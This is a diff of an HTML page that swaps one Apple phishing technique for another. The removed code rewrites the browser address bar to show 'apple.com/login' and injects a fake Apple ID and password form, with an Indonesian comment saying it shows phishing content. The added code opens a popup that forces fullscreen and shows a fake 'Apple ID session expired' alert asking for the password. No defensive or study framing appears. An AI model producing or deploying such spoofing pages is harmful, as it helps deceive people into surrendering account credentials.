@@ -1,44 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Loading...</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Secure Login</title>
   <style>
-    html, body {
-      margin: 0;
-      background: #f9f9f9;
+    body {
       font-family: -apple-system, sans-serif;
-    }
-    .center {
       display: flex;
-      justify-content: center;
-      align-items: center;
       height: 100vh;
+      align-items: center;
+      justify-content: center;
       flex-direction: column;
+    }
+    button {
+      font-size: 18px;
+      padding: 12px 24px;
     }
   </style>
 </head>
 <body>
-  <div class="center">
-    <h2>Loading...</h2>
-    <p>Please wait while we connect to your account.</p>
-  </div>
+  <h2>Session expired. Please login again.</h2>
+  <button onclick="spoof()">Login Again</button>
 
   <script>
-    // Ganti URL yang tampil di bilah alamat
-    history.replaceState({}, "", "https://apple.com/login");
-
-    // Tampilkan konten phishing
-    setTimeout(() => {
-      document.body.innerHTML = `
-        <div class="center">
-          <h2>🔒 Sign in to Apple</h2>
-          <input placeholder="Apple ID" /><br><br>
-          <input placeholder="Password" type="password" /><br><br>
-          <button>Continue</button>
-        </div>
-      `;
-    }, 1500);
+    function spoof() {
+      const win = window.open("about:blank", "_blank");
+      win.document.write(`
+        <body style="margin:0;display:flex;align-items:center;justify-content:center;flex-direction:column;font-family:sans-serif;">
+          <h2>🔒 Apple Verification</h2>
+          <p>Please wait...</p>
+          <script>
+            document.documentElement.requestFullscreen();
+            setTimeout(() => {
+              alert('🔒 Apple ID session expired. Please re-enter your password to continue.');
+            }, 1200);
+          <\/script>
+        </body>
+      `);
+    }
   </script>
 </body>
 </html>
